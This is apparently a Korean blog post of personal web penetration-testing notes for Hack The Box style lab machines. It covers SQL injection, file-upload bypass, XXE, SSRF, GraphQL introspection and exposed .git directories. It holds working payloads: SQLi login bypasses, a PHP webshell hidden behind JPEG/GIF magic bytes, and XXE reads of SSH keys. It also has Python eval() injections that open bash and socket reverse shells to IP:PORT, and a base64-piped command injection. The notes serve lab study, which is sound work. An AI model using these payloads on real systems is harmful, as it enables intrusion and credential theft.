---
slug: "web-checklist"
title: "web_checklist"
date: 2026-07-21
category: "웹 해킹"
tags: []
excerpt: "1. 페이지 접속 + 소스 확인 - footer나 소스에 도메인 보이면 그냥 등록하고 비교 - IP 접속 시 도메인으로 리다이렉트되면 `/etc/hosts` 등록 후 재접속"
readingTime: 17
---

# Web Checklist

## 기본 순서

1. 페이지 접속 + 소스 확인
	- footer나 소스에 도메인 보이면 그냥 등록하고 비교
    - IP 접속 시 도메인으로 리다이렉트되면 `/etc/hosts` 등록 후 재접속

        ```shell
        echo "IP domain.htb" | sudo tee -a /etc/hosts
        ```
    - 서브도메인 발견 시 동일하게 추가
        ```shell
        echo "IP gitea.domain.htb" | sudo tee -a /etc/hosts
        ```

2. robots.txt 확인

3. 디렉터리 브루트포싱

4. 기술스택 확인 (에러메시지, 헤더, Wappalyzer, **footer**)
	- 반드시 footer 버전 확인 후 CVE 검색
	- 페이지 footer에서 도메인/서브도메인 확인
	- /etc/hosts 등록 후 서브도메인 퍼징

5. 만약 CVE가 없다면
	- "CVE" 대신 "unauthenticated RCE", "misconfiguration" 같은 키워드로 재검색
	- **관리 콘솔/스크립트 실행 페이지 인증 여부 [[Jeeves]]**
	- **파일 업로드 기능 존재 시 CVE 여부와 무관하게 실제 테스트**
	- **혹시 모를 크레덴셜 탐색 ex) 회원 관리 페이지 같은 곳에서**
	-  [hackviser](https://hackviser.com/tactics/pentesting/services/jenkins)  여기에도 뭔가가 좀 있음
	- `<프레임워크명> settings file` / `config location` / `default credentials` 이런식으로 검색하기

6. 로그인/업로드/파라미터 확인

7. 취약점 → 쉘

8. 만약 웹쉘이 불편하다면 [[linux_privesc#SSH 업그레이드]]

https://www.exploit-db.com/




---
# 아래를 순서대로 실행해봐 생각하면서 실행해봐
---
## 디렉터리 브루트포싱

```bash
gobuster dir -u http://{IP} -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://{IP}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- wildcard response(302) 뜨면 `--exclude-length {length}` 추가
- 반드시 **도메인**으로 스캔 (IP로 하면 리다이렉트로 오탐)

서브도메인 탐색
~~~shell
gobuster vhost -u http://board.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
~~~

---
## 기술스택 확인

- 페이지 footer에 버전 정보 자주 노출됨
- 버전 확인되면 즉시 GitHub 커밋 히스토리 / CVE 검색
- `.git/config` 파일 확인 → 평문 크레덴셜 노출 가능
    
    ```
    url = http://[user]:[password]@host  # HTTP Basic Auth URL 형식
    ```

---
## SQLi 

**로그인 우회**
```
' or 1=1 --
' or 1=1-- -
admin'--
```

- Burp로 POST 요청 잡아서 파라미터 확인
- 평문 전송 여부 확인

**WebSocket SQLi**
 
- 페이지 소스에서 `ws://` 또는 `wss://` 확인
- 티켓 번호, ID 등 숫자형 값을 검증하는 기능

##### 기본 공격 흐름
1. Burp `Proxy → WebSockets history` 탭에서 메시지 캡처
2. Repeater로 보내서 수동 테스트
3. 숫자형 파라미터면 따옴표 없이 페이로드 삽입

```
# 문자열형 (따옴표 필요)
{"id":"1' or '1'='1"}

# 숫자형 (따옴표 불필요)
{"id":"1 or 1=1-- -"}

# 컬럼 수 확인
{"id":"1 union select 1,2,3-- -"}
```

**Blind SQLi** 
- /forget-password /reset-password 등 비밀번호 재설정 엔드포인트 테스트
- True/False 응답 차이 확인 후 [[Blind sqli script]] 활용 - 페이로드: `' or 1=1 -- -` vs `' or 1=2 -- -`

**참고**
- [[_soccer]] : WebSocket boolean-based blind SQLi → player 크레덴셜 탈취
- 
---
## 파일 업로드

체크 순서
1. 허용 확장자 확인 (소스코드 or 에러메시지)
2. MIME 타입 확인 (image/ 만 받는지)
3. magic bytes 우회 시도
4. 이중 확장자 시도 (.php.jpg)
5. Burp로 파일명 변경 후 제출(CVE-2023-24249 패턴: .php.jpg → .php)
		-> - 업로드 경로는 Burp 응답에서 확인 (/uploads/images/ 등)
	

**magic bytes 삽입**
```bash
# JPEG (FF D8 FF)
printf '\xff\xd8\xff' > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# GIF (GIF89a)
printf 'GIF89a' > shell.php.gif
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.gif

# 바이너리 확인
hexdump -C -n 16 {파일}

# 업로드 후 실행 확인
http://{IP}/{업로드경로}/{파일명}?cmd=whoami
```

**PHP 웹쉘**
php 필터링 중일때 우회
https://jorgectf.gitbook.io/awae-oswe-preparation-resources/by-vulnerability/file-upload-restrictions-bypass/file-extension-filters-bypass
```php
<?php system($_GET["cmd"]); ?>
```

-> 만약에 쉘 실행 안되면 아래 꺼 확인
```sh
# 파일 생성
<?php phpinfo(); ?>

python2 dfunc-bypasser.py --url {info 열린 url}
```
**disable_functions 우회**
- 쉘 안 될 때 phpinfo 먼저 확인
- `dfunc-bypasser`로 사용 가능한 위험 함수 추출 -> 해당 함수 사용
- `proc_open` 나오면 이걸로 리버스쉘 가능


**파일 업로드 + LFI 조합 시 (phar://)**
- 파일 업로드 + LFI 둘 다 있을 때 조합 가능
- zip으로 PHP 파일 압축 후 확장자 조작해서 업로드
```bash
zip exploit.k shell.php
# 업로드 후 LFI로 트리거
# phar://uploads/{dir}/exploit.k/shell
```
- `phar://` 래퍼는 확장자 무관하게 zip 내부 구조로 실행
- 매직바이트 검사 없으면 확장자만 바꿔도 통함
- 파일 삭제 로직 있을 때: zip 안에 URL 많이 넣어서 처리 시간 동안 트리거

**참고**
- [[networked]]: magic bytes(FF D8 FF) + .php.jpg 이중 확장자로 우회
- `hexdump -C -n 16 {파일}` 로 시그니처 확인 가능
- [[updown]] : disable_functions 우회
---
## XXE (XML External Entity)

XML 입력을 받는 기능 발견 시 시도

**체크 순서**
1. 페이지 소스에서 XML 버전 확인
2. Burp로 요청 인터셉트 → XML 구조 확인
3. DTD(!doctype) 선언 삽입 후 파일 읽기 시도

payload 템플릿 (문자열을 출력해줄 수 있는 곳에 엔티티를 넣어야 함)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>test</address>
</order>
```

**경로 예시**
- Windows: `file:///C:/Windows/win.ini`
- Windows SSH키: `file:///C:/Users/{username}/.ssh/id_rsa`
- Linux: `file:///etc/passwd`

**주의**
- `&xxe;` 세미콜론 필수
- 출력되는 태그에 entity 삽입해야 함 (item, address 등)
- 디렉터리는 못 읽고 파일만 읽기 가능

**참고**
- markup: daniel SSH 키 탈취 → SSH 접속

---
## eval() 인젝션 (Python)

Python 웹앱에서 `eval()`로 사용자 입력 처리 시 시도

```python
# 기본 형식
', exec("payload"))#

# 명령 실행
', exec("import os; os.system('bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"')"))#

# 소켓 방식 (가장 안정적)
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i']);"))#
```

- Burp에서 특수문자 포함 페이로드 전송 시 **Ctrl+U**로 URL 인코딩
- 참고: [busqueda]: (CVE-2023-43364, Searchor 2.4.0)

---
## SSRF (Server-Side Request Forgery)

#### 언제 의심하나
- URL/경로를 파라미터로 받는 기능 (forward_url, webhook, fetch 등)
- 내부 포트가 filtered인데 외부에서 접근 안 될 때
- 요청을 대신 날려주는 서비스 (request-baskets 등)

#### 기본 공격 흐름
1. forward_url 파라미터에 내부 주소 삽입
2. 서버가 대신 내부로 요청 날림 → 방화벽 우회
3. proxy_response: true면 응답 그대로 반환

#### request-baskets CVE-2023-27163 (v1.2.1 이하)
```bash
# basket 생성 (내부 80포트 포워딩)
curl -X POST http://{TARGET}:55555/api/baskets/{name} \
-H "Content-Type: application/json" \
-d '{"forward_url":"http://127.0.0.1:80","proxy_response":true,"insecure_tls":false,"expand_path":true,"capacity":200}'

# 이후 http://{TARGET}:55555/{name} 접속하면 내부 서비스 보임
```

#### 주요 파라미터
- `forward_url`: 포워딩할 내부 주소
- `proxy_response`: true = 응답 반환 / false = 포워딩만 (PoC용)
- `expand_path`: true = basket URL 뒤 경로가 forward_url에 붙음
#### 주의
- `/test` 같은 존재하지 않는 경로 넣으면 EOF
- expand_path: true면 경로 중복 주의 (forward_url에 경로 넣지 말 것)

### 참고
- [[sau]]: request-baskets SSRF → Maltrail RCE 체인
---
## OS Command Injection
- username/input 파라미터가 subprocess/exec으로 처리되는지 확인 
- ; 로 명령어 구분 가능한지 테스트  (ex - 'username=;`echo+"<BASE64>"+|+base64+-d+|+sh`')
- 페이로드는 base64 인코딩해서 안전하게 전송 
- HTTP 전송 과정에서 특수문자가 깨지지 않게 url 인코딩도 ㄱㄱ
- command injection 공백 우회: `${IFS}`, base64 인코딩 페이로드
### 참고
- [[sau]]: request-baskets SSRF → Maltrail RCE 체인
---
## Spring Boot
감지되면 `/actuator` 바로 체크
- `/actuator/mappings` → 숨겨진 엔드포인트 발견
- `/actuator/sessions` → 세션 탈취 → admin 접근

### 참고
- [[CozyHosting]]
---

이미 잘 정리되어 있어서 web_checklist.md에 바로 넣을 수 있는 형태로 다듬으면 이 정도면 돼:

---
## GraphQL Enumeration

### **탐지 단서**

- 응답 헤더에 `X-Powered-By: Express`
- 포트 3000 (Node.js 기본 포트)
- API 메시지에 "query"라는 워딩 사용

이 세 가지가 겹치면 GraphQL 가능성 높음. `/graphql` 경로 직접 찔러보기:
```
GET /graphql       → "GET query missing." (존재함)
GET /random_path    → "Cannot GET /random_path" (존재 안 함)
```
응답 메시지 차이로 엔드포인트 존재 여부 확인 가능.

### **REST API vs GraphQL**
```
REST API: 리소스마다 엔드포인트 분리
→ /class, /class/{id}, /class/{id}/students ...

GraphQL: 엔드포인트 하나, 쿼리로 원하는 데이터만 요청
→ /graphql (요청 body의 query 내용에 따라 응답 달라짐)
```

**살아있는지 확인**
```bash
curl -X POST "http://{target}:3000/graphql" -H "Content-Type: application/json" \
-d '{ "query": "{__typename}" }'
```

정상 응답(`{"data":{"__typename":"Query"}}`) 오면 GraphQL 확인됨.

### **Introspection 4단계 패턴**

**1단계 — 전체 타입 목록**
```graphql
{ __schema { types { name } } }
```

**2단계 — Query 진입점(필드) 확인**
```graphql
{ __type(name: "Query") { fields { name args { name type { name } } type { name } } } }
```

필드에 `args`가 있으면 인자 필요. 예: `args: [{"name":"id","type":{"name":"ID"}}]` → 호출 시 `{ user(id: "1") { ... } }`처럼 인자 넘겨야 함.

**3단계 — 반환 타입의 속성 확인**
```graphql
{ __type(name: "타입이름") { fields { name type { name } } } }
```

**4단계 — 실제 데이터 요청 (메타 쿼리 아닌 진짜 쿼리)**
```graphql
{ user { username password } }
```

→ 패턴 요약: **타입 목록 → Query 진입점 → 반환 타입 속성 → 실제 쿼리**, 이 순서로 모르는 GraphQL 서버도 동일하게 파고들 수 있음. `__type`, `__schema`, `fields`, `args`는 GraphQL 표준 introspection 키워드라 서버 종류 안 가리고 거의 그대로 적용 가능.

### 참고
- [[_help]] : grapsql 발견 후 사용
- ---
## .git

- `/dev/.git` 같은 노출된 git 디렉토리 나오면 `git-dumper`로 소스코드 덤프
- `git log --pretty=oneline` → 커밋 히스토리 확인
- `git show <커밋id>` → 당시 코드 확인
~~~sh
#/dev/.git이니까 dev.siteisup.htb에 대한 .git인거임
git-dumper http://siteisup.htb/dev/.git/ ./dumped

#요걸로 커밋 로그 확인 가능
git log --all                                                 
#요걸로 커밋 했던 내용들 볼 수 있음, 파일이름 안적어도 됨 적으면 해당 파일 커밋 내용 열람
git show <커밋_id:파일이름>
#요걸로 당시 커밋 버전으로 왔다갔다 가능
git checkout <커밋_id>
~~~

->
`<프레임워크명> settings file` / `config location` / `default credentials` 이런식으로 검색하기

**참고**
- [[dog]] : .git 활용의 극대화

---
## Path travelsal

~~~
Directory Traversal 페이로드: `GET /../../../../../../../../windows/win.ini`
~~~

**참고**
- [[servMon]] : pathtravelsal로 크레덴셜 파일 열람